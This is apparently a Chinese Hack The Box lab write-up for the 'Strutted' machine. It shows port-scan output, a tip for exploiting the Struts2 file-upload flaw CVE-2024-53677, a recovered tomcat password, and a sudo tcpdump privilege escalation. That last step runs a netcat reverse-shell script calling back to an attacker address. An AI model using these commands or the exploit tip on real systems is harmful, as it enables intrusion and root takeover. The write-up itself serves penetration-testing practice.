---
layout: post
title: HTB——Strutted
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Strutted/01.png?raw=true)

# 0x01 信息收集

---

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-04-04 03:06:30] [INFO] 暴力破解线程数: 1
[2025-04-04 03:06:30] [INFO] 开始信息扫描
[2025-04-04 03:06:30] [INFO] 最终有效主机数量: 1
[2025-04-04 03:06:30] [INFO] 开始主机扫描
[2025-04-04 03:06:30] [INFO] 有效端口数量: 233
[2025-04-04 03:06:33] [SUCCESS] 端口开放 10.129.151.183:80
[2025-04-04 03:06:33] [SUCCESS] 端口开放 10.129.151.183:22
[2025-04-04 03:06:33] [SUCCESS] 服务识别 10.129.151.183:22 => [ssh] 版本:8.9p1 Ubuntu 3ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10.]
[2025-04-04 03:06:38] [SUCCESS] 服务识别 10.129.151.183:80 => [http] 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu
[2025-04-04 03:06:38] [INFO] 存活端口数量: 2
[2025-04-04 03:06:38] [INFO] 开始漏洞扫描
[2025-04-04 03:06:38] [INFO] 加载的插件: ssh, webpoc, webtitle
[2025-04-04 03:06:39] [SUCCESS] 网站标题 http://10.129.151.183     状态码:302 长度:154    标题:302 Found 重定向地址: http://strutted.htb/
[2025-04-04 03:06:39] [SUCCESS] 网站标题 http://strutted.htb/      状态码:200 长度:5197   标题:Strutted™ - Instant Image Uploads                                                                                            
[2025-04-04 03:08:19] [SUCCESS] 扫描已完成: 3/3


 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.4  Expired: 2026.01.01
[03:07:15] [INFO] Start IpScan:10.129.151.183
[03:07:15] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

端口扫描   0% [░░░░░░░░░░░░░░░░░░░░] (9/65535) [0s:1h49m25s][03:07:16] [+] 10.129.151.183:22 open
[03:07:16] [+] 10.129.151.183:80 open
[03:07:21] [+] [TCP/SSH]  [OpenSSH 8.9p1 Ubuntu 3ubuntu0.10] 10.129.151.183:22 [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10]
[03:07:21] [INFO] start SSH check 10.129.151.183:22
[03:07:21] [+] 开始 SshScan 任务: SSH://10.129.151.183:22
[03:07:21] [+] [TCP/HTTP] [200] [Apache-Struts2][nginx/1.18.0 (Ubuntu)][Oracle-JAVA] http://10.129.151.183:80 [Strutted™ - Instant Image Uploads]
                                                          s] 
[03:08:19] [+] alive ports is: 2
[03:08:19] [+] Ip扫描结束:10.129.151.183
[03:08:19] [INFO] Start UrlScan:http://10.129.151.183:80
[03:08:20] [+] [TCP/HTTP] [200] [Oracle-JAVA][Apache-Struts2][nginx/1.18.0 (Ubuntu)] http://10.129.151.183:80 [Strutted™ - Instant Image Uploads]
                                                 
[03:08:20] [+] Url扫描结束:http://10.129.151.183:80
[03:08:20] [+] 项目任务完成:Default, Timeuse：62.595887379
[03:08:20] [+] 扫描结束,耗时: 1m3.061357697s
```

---

# 0x02 CVE-2024-53677利用

---

看到了标志性的`struts2`，上去是一个文件上传的功能。先点击download功能点，下载下来此docker构建的完整包。翻阅`pom.xml`观察到`struts2`的版本为`6.3.0.1`，查阅exploit发现`CVE-2024-53677`.请注意，在手动构造数据包时，第一个上传参数中的`Content-Disposition`内需要从`upload`改为`Upload`，否则此数据包不会被传递给`OGNL interceptor`中，造成漏洞的触发。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Strutted/02.png?raw=true)

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Strutted/03.png?raw=true)

解决了此问题后，我们就可以正常上马上线了。注意反弹shell指令要遵守`Java runtime-exec`规范，不然弹不了就自己哭去吧。上线后可以在conf文件夹翻到一个默认`tomcat-users`配置文件，内置默认密码`IT14d6SSP81k`。我们可以使用此密码一个个账户试，可以登陆上`james`用户。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Strutted/04.png?raw=true)

---

# 0x03 tcpdump提权

---

拿到`user.txt`后，我们使用`sudo`可以看到james用户有一个`tcpdump`的特权指令，我们尝试使用此指令提权。`gtfobins`内就有相关记录。

```bash
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

```bash
james@strutted:~$ echo 'mknod backpipe p && nc 10.10.16.6 54313 0<backpipe | /bin/bash 1>backpipe' > /tmp/evil.sh
james@strutted:~$ cat /tmp/evil.sh
mknod backpipe p && nc 10.10.16.6 54313 0<backpipe | /bin/bash 1>backpipe
james@strutted:~$ chmod +x /tmp/evil.sh
james@strutted:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell.sh -Z root
tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
5 packets received by filter
0 packets dropped by kernel
compress_savefile: execlp(/tmp/shell.sh, /dev/null) failed: No such file or directory
james@strutted:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/evil.sh -Z root
tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
30 packets received by filter
0 packets dropped by kernel
```

通过反弹shell就可以拿到`root`的shell了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Strutted/05.png?raw=true)

---

